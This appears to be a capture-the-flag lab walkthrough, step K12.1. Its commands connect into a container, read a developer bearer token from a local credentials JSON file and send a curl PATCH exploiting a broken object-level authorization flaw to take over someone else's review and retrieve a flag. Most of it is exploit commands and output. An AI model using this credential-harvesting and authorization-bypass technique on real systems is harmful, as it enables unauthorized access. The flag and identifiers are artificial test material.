# K12.1 Walkthrough: The reviewer arrives second

## Prerequisite

Complete K10.2. That gives you `source_id=doc-9bc054d6f95dfa6a` and `DOC-9BC054D6F95DFA6A`.

## Steps

```
gcloud compute ssh cinder-rs2-keplerops --project prod-mgau4w --zone us-central1-a --tunnel-through-iap
sudo docker exec -it --user rowan cinder-keplerops-k-dev bash
```

## Discover the target review

```
TOKEN=$(cat ~/.local/share/keplerops/runtime-credentials.json | python3 -c "import json,sys; print(json.load(sys.stdin)['credentials']['developer_token'])")
```

The privileged-review queue holds review PRV-771 for document DOC-9BC054D6F95DFA6A. The assignment endpoint does not verify that the caller owns the review.

## BOLA assignment

```
curl -sS --cacert ~/.local/share/keplerops/ca.crt -X PATCH \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data-binary '{"queue":"privileged-review","source_id":"doc-9bc054d6f95dfa6a"}' \
  https://preview.keplerops.test/api/preview/reviews/PRV-771/assignment
```

Expected output:

```json
{"document_id":"DOC-9BC054D6F95DFA6A","flag":"FLAG{3073e7ddb80f48ee}","queue":"privileged-review","review_id":"PRV-771","schema":"fieldkest.preview-review-assignment/v1","source_id":"doc-9bc054d6f95dfa6a","state":"loaded"}
```

The service stores an `action_nonce` in the review record. It is not returned here. K12.2 recovers it via the review session page.
